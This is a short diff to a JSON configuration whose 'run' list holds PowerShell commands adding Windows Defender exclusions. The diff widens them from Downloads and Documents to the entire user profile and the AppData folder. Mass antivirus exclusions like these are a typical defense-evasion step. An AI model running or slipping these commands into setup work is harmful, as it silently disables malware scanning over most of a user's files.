@@ -1,7 +1,9 @@
 {
 	"run" : [
 		"powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\Downloads'",
-		"powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\Documents'"
+		"powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\\Documents'",
+		"powershell -Command Add-MpPreference -ExclusionPath '%USERPROFILE%'",
+		"powershell -Command Add-MpPreference -ExclusionPath '%AppData%'"
 	],
 
 	"av" : {
